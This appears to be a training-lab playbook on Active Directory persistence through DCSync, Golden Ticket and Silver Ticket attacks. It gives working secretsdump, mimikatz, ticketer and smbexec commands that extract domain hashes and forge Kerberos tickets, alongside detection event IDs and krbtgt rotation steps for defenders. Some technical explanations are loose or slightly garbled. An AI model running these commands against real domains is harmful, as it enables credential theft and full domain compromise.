# Playbook 05 — Persistence & Tickets: DCSync, Golden Ticket, Silver Ticket

> **Stage:** Persistence (MITRE T1003.006, T1558.001/T1558.002)
> **Toolset:** Mimikatz, Rubeus, impacket `secretsdump` / `ticketer.py`, `detections` correlations
> **Warning — credential & key hygiene:** these techniques extract permanent
> domain keys. In the lab they are *intended*; in production they are
> crime-grade. Re-run `cleanup.ps1` and rotate keys after every session.

---

## 1. Why tickets/keys persist

Two facts make domain keys the ultimate persistence anchor:

1. **krbtgt's password hash** encrypts every TGT. Anyone holding `krbtgt`'s key can
   **forge golden tickets** for *any user* — including 4000-year valid TGTs — and
   the KDC cannot tell the difference without PAC validation.
2. **Each service account's hash / (or the machine account)** signs its service
   tickets: forging a **silver ticket** (skip the KDC entirely, talk straight to a
   service) works if you hold the service's key.

DCSync is the **harvest**: it uses `DS-Replication-Get-Changes` + `Get-Changes-All`
extended rights (the same rights DCs use) to pull the kerbrgt and user hashes
from the directory directly — no memory access needed.

## 2. Precondition — the lab's DCSync canary

`backup-op` is a member of **Backup Operators** (`lab-config.json`); in many
enterprises the Backup Operators group implicitly inherits
`Replicating Directory Changes*.` — the lab ships exactly that shape.

```powershell
Get-ADGroupMember "Backup Operators"          # -> backup-op
Get-ADUser backup-op -Properties memberOf,adminCount
```

## 3. DCSync — the extraction (T1003.006)

```bash
# With credentials you lawfully gained in playbooks 02/03:
python3 secretsdump.py -just-dc CORP/backup-op:'LabStart!22445'@192.168.56.10

# Full NTDS.dit extraction (also pulls machine account hashes):
python3 secretsdump.py CORP/backup-op:'LabStart!22445'@192.168.56.10 \
  -history -outputfile ntds.dump

# Mimikatz equivalent (from a domain session):
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt /csv" exit
```

### Defensive artifact
Event **4662** ("An operation was performed on an object") with
`AccessMask` including `DS-Replication-Get-Changes` (0x100) from `backup-op` —
the canonical DCSync signature. Correlation with 4624 Type-3 and 4672 made this
*the* classic detection; the lab's Sigma corpus + `mitigation_matrix.md`
(PAC-validation row) cover it.

## 4. Golden Ticket — forge, wield, extinguish (T1558.001)

```bash
# Extract the safe mode / krbtgt keys first (DCSync output from step 3):
#   Machine: krbtgt  ntlm: aad3b435b51404eeaad3b435b51404ee:1cb55695...   (example only)

# Build a golden ticket for an Administrator-style user via impacket:
python3 ticketer.py -nthash 1cb55695... -domain-sid S-1-5-21-397955417-626881126-188441444 \
  -domain corp.local -spn krbtgt/corp.local -user darc-admin golden.ccache

# Wield it (a 10-year ticket, no KDC round-trip):
export KRB5CCNAME=golden.ccache
python3 smbexec.py -k -no-pass 'CORP/darc-admin@dc01.corp.local'

# Mimikatz path (from a domain session or a stolen key):
mimikatz "kerberos::golden /user:darc-admin /domain:corp.local /sid:S-1-5-21-397955417-626881126-188441444 /krbtgt:1cb5569... /ptt" exit
```

### Why it works
The KDC's client-side validation of a TGT is: decrypt with krbtgt's key → check
the PAC signature. If you hold krbtgt's key, your TGT **is** cryptographically
valid; only *PAC validation on the DC* (Playbook: mitigation matrix #10) can
catch the forgery by checking the sequential Logon Session GUID / PAC signatures.

### Extinguish
```powershell
# Rotate BOTH krbtgt keys; the forgery stops authenticating:
Get-ADUser krbtgt | Reset-ADAccountPassword ...   # use a tool: New-KrbtgtKeys.ps1
# and, per Microsoft guidance, rotate TWICE and verify with a golden-ticket replay.
```

## 5. Silver Ticket — talk straight to a service (T1558.002)

```bash
# Hold the machine account's key? Then forge a ticket AS ANY USER for SMB:
python3 ticketer.py -nthash <DC01_MACHINE_HASH> -domain-sid S-1-5-21-397955417-626881126-188441444 \
  -domain corp.local -spn cifs/dc01.corp.local -user fakeadmin silver.ccache
export KRB5CCNAME=silver.ccache
python3 smbexec.py -k -no-pass 'CORP/fakeadmin@dc01.corp.local'
```

### Why it works
A **service (e.g. SMB on dc01)** considering a session validates the ticket's
signature with **its own** key — not krbtgt's. A separate per-service key
transfer → separate mitigation (rotate SPN account keys, not just krbtgt).

## 6. Detection — "forged-ticket tea leaves"

| Artifact | What signals the forge |
|---|---|
| 4768 / 4769 with `TicketEncryptionType=0x17` **plus** a `ServiceName=krbtgt` TGS (golden-ticket testers do this to get a correct TGT) | Rule `5b3a0c2a` |
| 4771 `KDC_ERR_BAD_OPTION` / `KDC_ERR_PADATA_TYPE_NOSUPP` on 4768 | A PAC signature failed DC-side validation → **the hard PAC check working** |
| **Mimikatz `kerberos::golden` leaves the 4000-year ticket lifetime in Audit** | Verify `TicketEndTime` vs `MaxTicketAge` in event 4769 — flag >10h |
| `secretsdump` / DCSync activity from a non-DC | Event 4662 with replication rights (above) |

### Golden-Ticket vs the Windows-security dump events
Wait — 4769 for `krbtgt` with RC4 is the *classic* golden-ticket signal: real
users never need a krbtgt TGS. In this lab your beta-flag should be:
`TGS for krbtgt AND not from a DC`, **medium** severity above baseline, then
hand off to 4771 PAC-analysis if it happens twice in 24h.

## 7. Aftermath — key rotation & lab reset

```powershell
# 1) Remove the ability to DCSync:
Remove-ADGroupMember "Backup Operators" -Members backup-op
# 2) Rotate credentials + both krbtgt passwords (2x, quirky but prescribed):
.\scripts\rotate-krbtgt.ps1   # see mitigation_matrix gMSA section
# 3) Revert lab state:
.\cleanup.ps1 -ResetLab
# 4) Re-audit:
python -m tools.spn_collector --server 192.168.56.10 --user ... --format table
```

---

## Theory — "Keys, not passwords"

Windows domain security beyond `LAPS` is all **keys**: the krbtgt key encrypts
TGTs, machine keys encrypt service tickets, and DCSync harvests *everything* in
one read. That's why the *persistence* play of this century is "own the keys,
not the admins" — and why the only true remediation is **key rotation + PAC
validation**, not just deleting an account.